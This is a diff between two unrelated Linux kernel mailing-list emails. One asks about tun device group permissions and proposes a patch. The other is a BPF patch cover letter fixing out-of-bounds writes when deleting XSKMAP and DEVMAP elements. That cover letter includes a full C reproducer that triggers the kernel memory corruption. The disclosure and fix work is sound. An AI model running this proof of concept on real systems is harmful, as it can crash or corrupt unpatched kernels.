@@ -1,124 +1,151 @@
-Return-Path: <netdev+bounces-145248-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-145249-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [IPv6:2604:1380:4601:e00::3])
-	by mail.lfdr.de (Postfix) with ESMTPS id CA55C9CDEAF
-	for <lists+netdev@lfdr.de>; Fri, 15 Nov 2024 13:52:55 +0100 (CET)
+Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
+	by mail.lfdr.de (Postfix) with ESMTPS id 9DAAA9CDEB3
+	for <lists+netdev@lfdr.de>; Fri, 15 Nov 2024 13:54:10 +0100 (CET)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by am.mirrors.kernel.org (Postfix) with ESMTPS id 77FAD1F24276
-	for <lists+netdev@lfdr.de>; Fri, 15 Nov 2024 12:52:55 +0000 (UTC)
+	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 63B982839A2
+	for <lists+netdev@lfdr.de>; Fri, 15 Nov 2024 12:54:09 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 8FA741BBBFE;
-	Fri, 15 Nov 2024 12:52:50 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id 9D2891BC073;
+	Fri, 15 Nov 2024 12:54:00 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=yandex.ru header.i=@yandex.ru header.b="PUZD5uU1"
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="ZGlM414j"
 X-Original-To: netdev@vger.kernel.org
-Received: from forward103b.mail.yandex.net (forward103b.mail.yandex.net [178.154.239.150])
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.12])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BE090558BB;
-	Fri, 15 Nov 2024 12:52:45 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=178.154.239.150
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6F6001B6D1B;
+	Fri, 15 Nov 2024 12:53:58 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=192.198.163.12
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1731675170; cv=none; b=PegACFTB0M4stgukUEm7VMe+ownyRTmW5NY6CC3ceLm6PgXdIitSeL+mVeYZIHxYDJPkeOgw7XR4PgC3V8WY2tN1pibe2TcHfuNx6ewIUHAPxIGXn5FX2Lz2+9FLBJlevUtCexkrMV+dNy3lN30999PU3FNR1Bo0wokpdSVEXVc=
+	t=1731675240; cv=none; b=dDRhJoXAs6WUfzDLeXKz6DJ8fOgSR6lh/9GH5VGcw7MeCMyfRqEp0vz0C1kF+RM/hNsC4m3k6MYeDjEo5b/3Ho48aAuVVmqZUseqVDLQ8qsP0xzh9CzUlQIbOr1FxfLGtRWZ1TkU4R8VINUjEIgqPWS3kW2i2CBcsx8hFoldurI=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1731675170; c=relaxed/simple;
-	bh=2juy4Ylv4MaM8LY8xJ4un4V+EwF5mFscetSWP49J2vM=;
-	h=Message-ID:Date:MIME-Version:To:Cc:From:Subject:Content-Type; b=u8B8MsZFYc/uE6hpzkU9VpHsYlxvSpJm4PgILmur0coNKKdFzMZIfPZ9WstxpNXyLr7cWYG/ytRKlv9fZFt/GB+jEkKoBKvn3KKGV8VnzP6MkTxF+zskDL4XiVZMhytGSHEAEiqmRLK4Qc0xaTkRbV/pNAyQ8tpvZ3tIyqEsleg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=yandex.ru; spf=pass smtp.mailfrom=yandex.ru; dkim=pass (1024-bit key) header.d=yandex.ru header.i=@yandex.ru header.b=PUZD5uU1; arc=none smtp.client-ip=178.154.239.150
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=yandex.ru
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=yandex.ru
-Received: from mail-nwsmtp-smtp-production-main-46.sas.yp-c.yandex.net (mail-nwsmtp-smtp-production-main-46.sas.yp-c.yandex.net [IPv6:2a02:6b8:c07:109:0:640:efe1:0])
-	by forward103b.mail.yandex.net (Yandex) with ESMTPS id 7B33B60912;
-	Fri, 15 Nov 2024 15:52:37 +0300 (MSK)
-Received: by mail-nwsmtp-smtp-production-main-46.sas.yp-c.yandex.net (smtp/Yandex) with ESMTPSA id aqMiAU8Or0U0-2DXNa1et;
-	Fri, 15 Nov 2024 15:52:36 +0300
-X-Yandex-Fwd: 1
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yandex.ru; s=mail;
-	t=1731675157; bh=Loh55YzRdUYifYSRVv6NI6kFX5r8vY1rNPibfZfJwAU=;
-	h=Subject:From:Cc:To:Date:Message-ID;
-	b=PUZD5uU1cHz8jBZUDFEaHPYeF9fuR3S84Dli4uWkLaEjJ3RvNohXFcfj8CS7blT80
-	 cKDxtkXLb/iJQZj6SqSqnYmIWWqUKwHQjuYhavFAAIWhuYeBJjVtgBYG7YI2F7bQl0
-	 nE4dKhVk0bDvP2nVI2FNzpf6NzoXUjAiP2LsXpkE=
-Authentication-Results: mail-nwsmtp-smtp-production-main-46.sas.yp-c.yandex.net; dkim=pass header.i=@yandex.ru
-Message-ID: <1f9e278a-6590-4ede-a74a-3923ebe4d154@yandex.ru>
-Date: Fri, 15 Nov 2024 15:52:36 +0300
+	s=arc-20240116; t=1731675240; c=relaxed/simple;
+	bh=FmQ9Z36su8JGdF2Pg0oHe5r6fJuAe7PGaffRn5ArjwQ=;
+	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=odZD8USdEQVE1pONHR+CKNVWestwgHP4srnmnLwKtHOJdDsRzRvwIBE+7tBWS5h/yBk/7bDGD3Wwtsj7rEOz9GjGPeXIZn9B88yjYXCXWz3NJlMwrVvu+2incbjXew01t3S8ffP71g/zdLbwyYejk/yaSuHK0R+bO8662eUKy2M=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=ZGlM414j; arc=none smtp.client-ip=192.198.163.12
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1731675239; x=1763211239;
+  h=from:to:cc:subject:date:message-id:mime-version:
+   content-transfer-encoding;
+  bh=FmQ9Z36su8JGdF2Pg0oHe5r6fJuAe7PGaffRn5ArjwQ=;
+  b=ZGlM414jmooIat5pVhoL/IZ5OVbZ3m6RsWISKIMBQpV8TkREfu/qD38+
+   bHDYRalaU2BrqbK+RsTv1XsZOMhyNHiUcuNZFHECwS9DNyUubHkX4mJ9P
+   Ik8XRpbvm12NjiuS7Esvfrhodu9k7FnDWrDsenrwbs/lbujLmoQne69ph
+   GK91GgXHsbJ9ICzCgYsHjShJEWxlA+4QpRa/VE7RhxyFnbZszHUhzEJyo
+   D2p7Z5WCoTzjRnCrdR/nFdbrwoNMnGIaKY8e/nvTxpvnfAadneSIE24i7
+   tJhCMsz3erUKdVAu0Hcth5TwXNx0iNFioXaPrTpCMtQAr1WneRfx9nLIe
+   Q==;
+X-CSE-ConnectionGUID: rejdBnQaR2KVNsl4cJqJag==
+X-CSE-MsgGUID: Ex3nvcw5QAaFv+YPsH8olA==
+X-IronPort-AV: E=McAfee;i="6700,10204,11257"; a="35607628"
+X-IronPort-AV: E=Sophos;i="6.12,156,1728975600"; 
+   d="scan'208";a="35607628"
+Received: from orviesa009.jf.intel.com ([10.64.159.149])
+  by fmvoesa106.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 15 Nov 2024 04:53:57 -0800
+X-CSE-ConnectionGUID: yWzKaKa8SKqWOafSEWAdhQ==
+X-CSE-MsgGUID: Ac5EO7nvSSG7IVDWl58rhw==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.12,156,1728975600"; 
+   d="scan'208";a="88555488"
+Received: from boxer.igk.intel.com ([10.102.20.173])
+  by orviesa009.jf.intel.com with ESMTP; 15 Nov 2024 04:53:55 -0800
+From: Maciej Fijalkowski <maciej.fijalkowski@intel.com>
+To: bpf@vger.kernel.org,
+	ast@kernel.org,
+	daniel@iogearbox.net,
+	andrii@kernel.org
+Cc: netdev@vger.kernel.org,
+	magnus.karlsson@intel.com,
+	bjorn@kernel.org,
+	maciej.fijalkowski@intel.com,
+	jordyzomer@google.com,
+	security@kernel.org
+Subject: [PATCH bpf 0/2] bpf: fix OOB accesses in map_delete_elem callbacks
+Date: Fri, 15 Nov 2024 13:53:46 +0100
+Message-Id: <20241115125348.654145-1-maciej.fijalkowski@intel.com>
+X-Mailer: git-send-email 2.38.1
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-To: netdev <netdev@vger.kernel.org>
-Cc: Linux kernel <linux-kernel@vger.kernel.org>,
- "Eric W. Biederman" <ebiederm@xmission.com>,
- "Andrew Bird (Sphere Systems)" <ajb@spheresystems.co.uk>
-From: stsp <stsp2@yandex.ru>
-Subject: tun: group check overrides user, is this intentional?
-Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 8bit
 
-Hello.
+Hi,
 
-I've found that the user that is an owner
-of tun device, can't access it if it is not
-in the tun's group.
-I.e. the following command:
-$ sudo tunctl -u stas -g root
+Jordy reported that for big enough XSKMAPs and DEVMAPs, when deleting
+elements, OOB writes occur.
 
-is insufficient for the user "stas"
-to access tun, unless he has group
-"root" in his supplementary list.
-This is somewhat very strange, as
-the group check usually enlarges
-the scope, not restricts it.
+Reproducer below:
 
-I am going to send the patch below,
-but I'd like to ask if maybe this is
-intentional?
+// compile with gcc -o map_poc map_poc.c -lbpf
+#include <errno.h>
+#include <linux/bpf.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <unistd.h>
 
-diff --git a/drivers/net/tun.c b/drivers/net/tun.c
-index 9a0f6eb32016..d35b6a48d138 100644
---- a/drivers/net/tun.c
-+++ b/drivers/net/tun.c
-@@ -574,14 +574,18 @@ static u16 tun_select_queue(struct net_device 
-*dev, struct sk_buff *skb,
-         return ret;
-  }
 
--static inline bool tun_not_capable(struct tun_struct *tun)
-+static inline bool tun_capable(struct tun_struct *tun)
-  {
-         const struct cred *cred = current_cred();
-         struct net *net = dev_net(tun->dev);
+int main() {
+  // Create a large enough BPF XSK map
+  int map_fd;
+  union bpf_attr create_attr = {
+      .map_type = BPF_MAP_TYPE_XSKMAP,
+      .key_size = sizeof(int),
+      .value_size = sizeof(int),
+      .max_entries = 0x80000000 + 2,
+  };
 
--       return ((uid_valid(tun->owner) && !uid_eq(cred->euid, 
-tun->owner)) ||
--                 (gid_valid(tun->group) && !in_egroup_p(tun->group))) &&
--               !ns_capable(net->user_ns, CAP_NET_ADMIN);
-+       if (ns_capable(net->user_ns, CAP_NET_ADMIN))
-+               return 1;
-+       if (uid_valid(tun->owner) && uid_eq(cred->euid, tun->owner))
-+               return 1;
-+       if (gid_valid(tun->group) && in_egroup_p(tun->group))
-+               return 1;
-+       return 0;
-  }
+  map_fd = syscall(SYS_bpf, BPF_MAP_CREATE, &create_attr, sizeof(create_attr));
+  if (map_fd < 0) {
+    fprintf(stderr, "Failed to create BPF map: %s\n", strerror(errno));
+    return 1;
+  }
 
-  static void tun_set_real_num_queues(struct tun_struct *tun)
-@@ -2778,7 +2782,7 @@ static int tun_set_iff(struct net *net, struct 
-file *file, struct ifreq *ifr)
-                     !!(tun->flags & IFF_MULTI_QUEUE))
-                         return -EINVAL;
 
--               if (tun_not_capable(tun))
-+               if (!tun_capable(tun))
-                         return -EPERM;
-                 err = security_tun_dev_open(tun->security);
-                 if (err < 0)
+  // Delete an element from the map using syscall
+  unsigned int key = 0x80000000 + 1;
+  if (syscall(SYS_bpf, BPF_MAP_DELETE_ELEM,
+              &(union bpf_attr){
+                  .map_fd = map_fd,
+                  .key = &key,
+              },
+              sizeof(union bpf_attr)) < 0) {
+    fprintf(stderr, "Failed to delete element from BPF map: %s\n",
+            strerror(errno));
+    return 1;
+  }
+
+  close(map_fd);
+  return 0;
+}
+
+This tiny series changes data types from int to u32 of keys being used
+for map accesses.
+
+Thanks,
+Maciej
+
+Maciej Fijalkowski (2):
+  xsk: fix OOB map writes when deleting elements
+  bpf: fix OOB devmap writes when deleting elements
+
+ kernel/bpf/devmap.c | 6 +++---
+ net/xdp/xskmap.c    | 2 +-
+ 2 files changed, 4 insertions(+), 4 deletions(-)
+
+-- 
+2.34.1
 
 
